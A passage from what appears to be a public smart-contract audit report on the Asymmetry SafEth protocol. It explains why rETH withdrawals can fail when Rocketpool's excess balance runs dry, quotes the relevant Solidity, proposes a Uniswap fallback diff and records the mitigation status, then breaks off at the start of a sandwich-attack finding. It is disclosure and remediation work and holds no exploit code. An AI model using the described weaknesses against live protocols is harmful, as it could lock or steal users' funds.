stakers but that is not yet staked on the Ethereum beacon chain. So Rocketpool allows users to burn <code>rETH</code> and withdraw <code>ETH</code> as long as the excess balance is sufficient.</p>\n<p>The issue is obvious now: If there is no excess balance because enough users burn <code>rETH</code> or the Minipool capacity increases, the Asymmetry protocol is bascially unable to operate.</p>\n<p>Withdrawals are then impossible which bricks <code>SafEth.unstake</code> and <code>SafEth.rebalanceToWeights</code>.</p>\n<h3 id=\"proof-of-concept-4\" style=\"position:relative;\"><a href=\"#proof-of-concept-4\" aria-label=\"proof of concept 4 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Proof of Concept</h3>\n<p>I show in this section how the current withdrawal flow for the <code>Reth</code> derivative is dependend on there being <em>excess balance</em> in the RocketDepositPool.</p>\n<p>The current withdrawal flow calls <code>RocketTokenRETH.burn</code> which executes this code:</p>\n<p><a href=\"https://github.com/rocket-pool/rocketpool/blob/967e4d3c32721a84694921751920af313d1467af/contracts/contract/token/RocketTokenRETH.sol#L106-L123\">Link</a></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"46\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">burn</span><span class=\"mtk1\">(</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_rethAmount</span><span class=\"mtk1\">) </span><span class=\"mtk11\">override</span><span class=\"mtk1\"> </span><span class=\"mtk11\">external</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk3\">// Check rETH amount</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk11\">require</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_rethAmount</span><span class=\"mtk1\"> &gt; </span><span class=\"mtk7\">0</span><span class=\"mtk1\">, </span><span class=\"mtk8\">&quot;Invalid token burn amount&quot;</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk11\">require</span><span class=\"mtk1\">(</span><span class=\"mtk11\">balanceOf</span><span class=\"mtk1\">(</span><span class=\"mtk12\">msg</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sender</span><span class=\"mtk1\">) &gt;= </span><span class=\"mtk12\">_rethAmount</span><span class=\"mtk1\">, </span><span class=\"mtk8\">&quot;Insufficient rETH balance&quot;</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk3\">// Get ETH amount</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">ethAmount</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">getEthValue</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_rethAmount</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk3\">// Get &amp; check ETH balance</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">ethBalance</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">getTotalCollateral</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk11\">require</span><span class=\"mtk1\">(</span><span class=\"mtk12\">ethBalance</span><span class=\"mtk1\"> &gt;= </span><span class=\"mtk12\">ethAmount</span><span class=\"mtk1\">, </span><span class=\"mtk8\">&quot;Insufficient ETH balance for exchange&quot;</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk3\">// Update balance &amp; supply</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk11\">_burn</span><span class=\"mtk1\">(</span><span class=\"mtk12\">msg</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sender</span><span class=\"mtk1\">, </span><span class=\"mtk12\">_rethAmount</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk3\">// Withdraw ETH from deposit pool if required</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk11\">withdrawDepositCollateral</span><span class=\"mtk1\">(</span><span class=\"mtk12\">ethAmount</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk3\">// Transfer ETH to sender</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">msg</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sender</span><span class=\"mtk1\">.</span><span class=\"mtk11\">transfer</span><span class=\"mtk1\">(</span><span class=\"mtk12\">ethAmount</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk3\">// Emit tokens burned event</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">emit</span><span class=\"mtk1\"> </span><span class=\"mtk11\">TokensBurned</span><span class=\"mtk1\">(</span><span class=\"mtk12\">msg</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sender</span><span class=\"mtk1\">, </span><span class=\"mtk12\">_rethAmount</span><span class=\"mtk1\">, </span><span class=\"mtk12\">ethAmount</span><span class=\"mtk1\">, </span><span class=\"mtk12\">block</span><span class=\"mtk1\">.</span><span class=\"mtk12\">timestamp</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">}</span></span></span></code></pre>\n<p>This executes <code>withdrawDepositCollateral(ethAmount)</code>:</p>\n<p><a href=\"https://github.com/rocket-pool/rocketpool/blob/967e4d3c32721a84694921751920af313d1467af/contracts/contract/token/RocketTokenRETH.sol#L126-L133\">Link</a></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"47\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">withdrawDepositCollateral</span><span class=\"mtk1\">(</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_ethRequired</span><span class=\"mtk1\">) </span><span class=\"mtk11\">private</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk3\">// Check rETH contract balance</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">ethBalance</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk4\">this</span><span class=\"mtk1\">).</span><span class=\"mtk12\">balance</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">ethBalance</span><span class=\"mtk1\"> &gt;= </span><span class=\"mtk12\">_ethRequired</span><span class=\"mtk1\">) { </span><span class=\"mtk15\">return</span><span class=\"mtk1\">; }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk3\">// Withdraw</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">RocketDepositPoolInterface</span><span class=\"mtk1\"> </span><span class=\"mtk12\">rocketDepositPool</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">RocketDepositPoolInterface</span><span class=\"mtk1\">(</span><span class=\"mtk11\">getContractAddress</span><span class=\"mtk1\">(</span><span class=\"mtk8\">&quot;rocketDepositPool&quot;</span><span class=\"mtk1\">));</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">rocketDepositPool</span><span class=\"mtk1\">.</span><span class=\"mtk11\">withdrawExcessBalance</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_ethRequired</span><span class=\"mtk1\">.</span><span class=\"mtk11\">sub</span><span class=\"mtk1\">(</span><span class=\"mtk12\">ethBalance</span><span class=\"mtk1\">));</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">}</span></span></span></code></pre>\n<p>This then calls <code>rocketDepositPool.withdrawExcessBalance(_ethRequired.sub(ethBalance))</code> to get the <code>ETH</code> from the <em>excess balance</em>:</p>\n<p><a href=\"https://github.com/rocket-pool/rocketpool/blob/967e4d3c32721a84694921751920af313d1467af/contracts/contract/deposit/RocketDepositPool.sol#L194-L206\">Link</a></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"48\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">withdrawExcessBalance</span><span class=\"mtk1\">(</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_amount</span><span class=\"mtk1\">) </span><span class=\"mtk11\">override</span><span class=\"mtk1\"> </span><span class=\"mtk11\">external</span><span class=\"mtk1\"> </span><span class=\"mtk11\">onlyThisLatestContract</span><span class=\"mtk1\"> </span><span class=\"mtk11\">onlyLatestContract</span><span class=\"mtk1\">(</span><span class=\"mtk8\">&quot;rocketTokenRETH&quot;</span><span class=\"mtk1\">, msg.sender) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk3\">// Load contracts</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">RocketTokenRETHInterface</span><span class=\"mtk1\"> </span><span class=\"mtk12\">rocketTokenRETH</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">RocketTokenRETHInterface</span><span class=\"mtk1\">(</span><span class=\"mtk11\">getContractAddress</span><span class=\"mtk1\">(</span><span class=\"mtk8\">&quot;rocketTokenRETH&quot;</span><span class=\"mtk1\">));</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">RocketVaultInterface</span><span class=\"mtk1\"> </span><span class=\"mtk12\">rocketVault</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">RocketVaultInterface</span><span class=\"mtk1\">(</span><span class=\"mtk11\">getContractAddress</span><span class=\"mtk1\">(</span><span class=\"mtk8\">&quot;rocketVault&quot;</span><span class=\"mtk1\">));</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk3\">// Check amount</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk11\">require</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_amount</span><span class=\"mtk1\"> &lt;= </span><span class=\"mtk11\">getExcessBalance</span><span class=\"mtk1\">(), </span><span class=\"mtk8\">&quot;Insufficient excess balance for withdrawal&quot;</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk3\">// Withdraw ETH from vault</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">rocketVault</span><span class=\"mtk1\">.</span><span class=\"mtk11\">withdrawEther</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_amount</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk3\">// Transfer to rETH contract</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">rocketTokenRETH</span><span class=\"mtk1\">.</span><span class=\"mtk12\">depositExcess</span><span class=\"mtk1\">{value: </span><span class=\"mtk12\">_amount</span><span class=\"mtk1\">}();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk3\">// Emit excess withdrawn event</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">emit</span><span class=\"mtk1\"> </span><span class=\"mtk11\">ExcessWithdrawn</span><span class=\"mtk1\">(</span><span class=\"mtk12\">msg</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sender</span><span class=\"mtk1\">, </span><span class=\"mtk12\">_amount</span><span class=\"mtk1\">, </span><span class=\"mtk12\">block</span><span class=\"mtk1\">.</span><span class=\"mtk12\">timestamp</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">}</span></span></span></code></pre>\n<p>And this function reverts if the <em>excess balance</em> is insufficient which you can see in the <code>require(_amount &#x3C;= getExcessBalance(), \"Insufficient excess balance for withdrawal\");</code> check.</p>\n<h3 id=\"tools-used-2\" style=\"position:relative;\"><a href=\"#tools-used-2\" aria-label=\"tools used 2 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Tools Used</h3>\n<p>VSCode</p>\n<h3 id=\"recommended-mitigation-steps-3\" style=\"position:relative;\"><a href=\"#recommended-mitigation-steps-3\" aria-label=\"recommended mitigation steps 3 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Recommended Mitigation Steps</h3>\n<p>The solution for this issue is to have an alternative withdrawal mechanism in case the <em>excess balance</em> in the RocketDepositPool is insufficient to handle the withdrawal.</p>\n<p>The alternative withdrawal mechanism is to sell the <code>rETH</code> tokens via the Uniswap pool.</p>\n<p>You can use the <a href=\"https://github.com/rocket-pool/rocketpool/blob/967e4d3c32721a84694921751920af313d1467af/contracts/contract/deposit/RocketDepositPool.sol#L59-L67\"><code>RocketDepositPool.getExcessBalance</code></a> to check if there is sufficient excess <code>ETH</code> to withdraw from Rocketpool or if the withdrawal must be made via Uniswap.</p>\n<p>The pseudocode of the new withdraw flow looks like this:</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"\" data-index=\"49\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\">function withdraw(uint256 amount) external onlyOwner {</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    if (rocketDepositPool excess balance is sufficient) {</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        RocketTokenRETHInterface(rethAddress()).burn(amount);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        // solhint-disable-next-line</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        (bool sent, ) = address(msg.sender).call{value: address(this).balance}(</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">            &quot;&quot;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        );</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        require(sent, &quot;Failed to send Ether&quot;);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    } else {</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        // swap rETH for ETH via Uniswap pool</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    }</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">}</span></span></code></pre>\n<p>I also wrote the code for the changes that I suggest:</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"diff\" data-index=\"50\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">diff --git a/contracts/SafEth/derivatives/Reth.sol b/contracts/SafEth/derivatives/Reth.sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">index b6e0694..b699d5c 100644</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">--- a/contracts/SafEth/derivatives/Reth.sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">+++ b/contracts/SafEth/derivatives/Reth.sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">@@ -105,11 +105,24 @@ contract Reth is IDerivative, Initializable, OwnableUpgradeable {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">         @notice - Convert derivative into ETH</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      */</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">     function withdraw(uint256 amount) external onlyOwner {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-        RocketTokenRETHInterface(rethAddress()).burn(amount);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-        // solhint-disable-next-line</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-        (bool sent, ) = address(msg.sender).call{value: address(this).balance}(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-            &quot;&quot;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-        );</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+        if (canWithdrawFromRocketPool(amount)) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+            RocketTokenRETHInterface(rethAddress()).burn(amount);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+            // solhint-disable-next-line</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+        } else {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+            uint256 minOut = ((((poolPrice() * amount) / 10 ** 18) *</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+                ((10 ** 18 - maxSlippage))) / 10 ** 18);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+            IWETH(W_ETH_ADDRESS).deposit{value: msg.value}();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+            swapExactInputSingleHop(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+                rethAddress(),</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+                W_ETH_ADDRESS,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+                500,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+                amount,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+                minOut</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+            );</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+        }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+        (bool sent, ) = address(msg.sender).call{value: address(this).balance}(&quot;&quot;);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">         require(sent, &quot;Failed to send Ether&quot;);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">     }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\"> </span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">@@ -149,6 +162,21 @@ contract Reth is IDerivative, Initializable, OwnableUpgradeable {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">             _amount &gt;= rocketDAOProtocolSettingsDeposit.getMinimumDeposit();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">     }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\"> </span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+    function canWithdrawFromRocketPool(uint256 _amount) private view returns (bool) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+        address rocketDepositPoolAddress = RocketStorageInterface(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+            ROCKET_STORAGE_ADDRESS</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+        ).getAddress(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+                keccak256(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+                    abi.encodePacked(&quot;contract.address&quot;, &quot;rocketDepositPool&quot;)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+                )</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+            );</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+        RocketDepositPoolInterface rocketDepositPool = RocketDepositPoolInterface(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+                rocketDepositPoolAddress</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+            );</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+        uint256 _ethAmount = RocketTokenRETHInterface(rethAddress()).getEthValue(_amount);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+        return rocketDepositPool.getExcessBalance() &gt;= _ethAmount;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+    }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+</span></span></span></code></pre>\n<p><strong><a href=\"https://github.com/code-423n4/2023-03-asymmetry-findings/issues/210#issuecomment-1500642915\">toshiSat (Asymmetry) confirmed, but disagreed with severity and commented</a>:</strong></p>\n<blockquote>\n<p>The deposit pool is mostly always full, but the warden does have a point and we should allow for multiple options.</p>\n</blockquote>\n<p><strong><a href=\"https://github.com/code-423n4/2023-05-asymmetry-mitigation-contest#mitigations-to-be-reviewed\">Asymmetry mitigated</a>:</strong></p>\n<blockquote>\n<p>Check if withdraw from deposit contract possible.<br></p>\n</blockquote>\n<p><strong>Status:</strong> Sub-optimally mitigated. Full details in reports from <a href=\"https://github.com/code-423n4/2023-05-asymmetry-mitigation-findings/issues/56\">d3e4</a>, <a href=\"https://github.com/code-423n4/2023-05-asymmetry-mitigation-findings/issues/41\">adriro</a>, and <a href=\"https://github.com/code-423n4/2023-05-asymmetry-mitigation-findings/issues/11\">0x52</a>.</p>\n<hr>\n<h2 id=\"h-08-staking-unstaking-and-rebalancetoweight-can-be-sandwiched-mainly-reth-deposit\" style=\"position:relative;\"><a href=\"#h-08-staking-unstaking-and-rebalancetoweight-can-be-sandwiched-mainly-reth-deposit\" aria-label=\"h 08 staking unstaking and rebalancetoweight can be sandwiched mainly reth deposit permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a><a href=\"https://github.com/code-423n4/2023-03-asymmetry-findings/issues/142\">[H-08] Staking, unstaking and rebalanceToWeight can be sandwiched (Mainly rETH deposit)</a></h2>\n<p><em>Submitted by <a href=\"https://github.com/code-423n4/2023-03-asymmetry-findings/issues/142\">HHK</a>, also found by <a href=\"https://github.com/code-423n4/2023-03-asymmetry-findings/issues/1140\">nowonder92</a>, <a href=\"https://github.com/code-423n4/2023-03-asymmetry-findings/issues/1139\">ernestognw</a>, <a href=\"https://github.com/code-423n4/2023-03-asymmetry-findings/issues/1138\">MiloTruck</a>, <a href=\"https://github.com/code-423n4/2023-03-asymmetry-findings/issues/1130\">tank</a>, <a href=\"https://github.com/code-423n4/2023-03-asymmetry-findings/issues/1125\">ulqiorra</a>, <a href=\"https://github.com/code-423n4/2023-03-asymmetry-findings/issues/1112\">ulqiorra</a>, <a href=\"https://github.com/code-423n4/2023-03-asymmetry-findings/issues/1108\">ulqiorra</a>, <a href=\"https://github.com/code-423n4/2023-03-asymmetry-findings/issues/1101\">Toshii</a>, <a href=\"https://github.com/code-423n4/2023-03-asymmetry-findings/issues/1060\">wen</a>, <a href=\"https://github.com/code-423n4/2023-03-asymmetry-findings/issues/1056\">pontifex</a>, <a href=\"https://github.com/code-423n4/2023-03-asymmetry-findings/issues/1034\">shuklaayush</a>, <a href=\"https://github.com/code-423n4/2023-03-asymmetry-findings/issues/1012\">nemveer</a>, <a href=\"https://github.com/code-423n4/2023-03-asymmetry-findings/issues/1009\">shuklaayush</a>, <a href=\"https://github.com/code-423n4/2023-03-asymmetry-findings/issues/996\">carlitox477</a>, <a href=\"https://github.com/code-423n4/2023-03-asymmetry-findings/issues/992\">skidog</a>, <a href=\"https://github.com/code-423n4/2023-03-asymmetry-findings/issues/989\">Viktor_Cortess</a>, <a href=\"https://github.com/code-423n4/2023-03-asymmetry-findings/issues/986\">0xepley</a>, <a href=\"https://github.com/code-423n4/2023-03-asymmetry-findings/issues/961\">0xepley</a>, <a href=\"https://github.com/code-423n4/2023-03-asymmetry-findings/issues/953\">kaden</a>, <a 